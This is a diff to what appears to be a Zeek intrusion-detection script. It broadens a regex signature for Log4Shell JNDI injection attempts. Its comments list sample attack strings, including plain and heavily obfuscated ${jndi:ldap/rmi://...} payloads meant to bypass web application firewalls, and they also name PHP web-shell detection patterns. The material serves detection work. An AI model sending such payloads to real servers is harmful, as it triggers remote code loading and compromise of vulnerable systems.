@@ -57,7 +57,7 @@ export {
     /(str_replace[[:space:]]*?\+*?\()/i |
     /(file_get_contents[[:space:]]*?\+*?\()/i | #Example: $code = file_get_contents('https://pastebin[.]com/raw/63LjCNAs');
     /(PHP Obfuscator)/ |
-    /\$\{.*?j.*?n.*?d.*?i.*?\:.*\/\/.*\}/i | # Based on https://nakedsecurity.sophos.com/2021/12/10/log4shell-java-vulnerability-how-to-safeguard-your-servers/ and Tweets about WAF bypasses.
+    /\$\{.*?j.*?n.*?d.*?i.*?\:/i | # Based on https://nakedsecurity.sophos.com/2021/12/10/log4shell-java-vulnerability-how-to-safeguard-your-servers/ and Tweets about WAF bypasses.
     #   Examples:
     #   ua_list=[
     #   "${jndi:ldap://192.168.2.210/a}",
@@ -68,6 +68,11 @@ export {
     #   "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://192.168.2.210:1389/a}",
     #   "${${::-j}ndi:rmi://192.168.2.210:1389/a}",
     #   "${${lower:${lower:jndi}}:${lower:rmi}://192.168.2.210/poc}"]
+    #   ${${nCdl:xlKziH:B:HfDmcQ:-j}${BYkus :XmUteQ:-n}${gN: NI:-d}${sLUUc:fh:eIw:-i}${XWAhx:gtd:-:}${sqf:-1}${tgyMAW: YoRmXr:LMC:Qv G:-d}${B:DUPb:oSgUuo :xQz:gnYNX:-a}${YSJj:n:axeC:-p}${ylanor:VdRoFV:-: }${hu: eM:GKLG:XHOX:G:-/}${ks: PMA: LE: YUmi: LVrcMe:-/}$ {qVmdFK:-1}${GjiHeL: ERaPpC:CGNApg :-2}${MVU:-7}${IUEN:FM:G:Acq:-.}${WCYvc:-0}${dW:m:qtqMg:k:-.}${eS:-0}${qaTNqU:afnqb:RsE: P:Wag:-.}${Kqsld:-1}${Yh:-:}${Pd:vkyJfY:-1}${m: GO:-6}${twU:w: fMJFW:qb:JqSFP:-6}${mgUuFB:E:C:mJXbp:-4}${iVvv:cjOHtL:wo:IY kv:mMLV:-/}${${hWafTL:TR: GKneYS:-s}${LGL:Upqn:F:-y}${JOOU: LMQIPH:-s}${UYrvc:nv:0iQFc:G:-:}${LRaJh:zyD:-j}${G:a:po:if:-a}$ {yWTyt: Cbzj: eKui:-v}${f:yHA:k:-a}${tel:X:bki:-.}${bdE:DsswVr:-r}${iqoNvo:liis:-u}${VUSSL:nvFK: GqDir:-n}${x:eaYvi:J:FfAVgo :-t}${s:-i}${Wv:r:CH:-m>${RWIHGN:f:m:EBd:-e}${L:FxgFA:-- }${FFTDAY:GhA:-v}${LZKAHu: jkaEjK:fJ:-e}${pJoXcy:-r}${VVZS: VMDP: hB I:czXSu:JM:-s}${WFHCr:EyBTW:dHYnWi:FJA:-i}${o:LqDYN: EGYAGO:ApPu:JH:-0}${YLO:-n}}}
+    #   ${${CP:C:F:BPs:Ic:-j}${ZE:-n}${vCpb:uplbl:Y:muYSk:BegoEg:-d}i:${XK:dMfzh:UQE:vF0es:vCyYqA:-1}dap:${mmt:VcXOTP:-/}/1${uBkj Nk:-2}${bL:TSPH:C:-7}${l:0H: RJDiz:Kcyx:sn:-.}${jv: fpJc:vq:-0}.0.1${FkS:Bn:- : }${tYFW:DXCL:-1}6${U:QWVXnG:-6}${Amn: h:-4}${C Wgo: HBfHwL:Mszq: Gq:CLezp:-/}${${Fdz:MaCs:-s}${H:qVow: Nq:F:LzRJWi:-y}s:java.${PNfjDF:FhUPeS:R: pqhvq:-r}untim${y:XAHbxU:n:W Q:-e}${iYVOXl:bDYMa:q:Sbs:-. }${KLceP:-v}${rBSn:JFM:C:WBOH:eAbcE:-e}r${eCzFW:-s}i${InU:e:X:-0}n}}
+    # Note on thhe above signature. I could improve the efficacy of the signature by also looking for a protocol, //, or closing bracket. But it would come at the cost of performance. This will still catch crazy obfuscations like the two lines above without the high number of regex steps.
+    # In other words, it does the right thing even if it isn't in the most correct way.
+
     # /(\?\>)/ | Too many false positives. Legitimate XML Ending
     # /(\%\>)/ | Too many false positives.
 
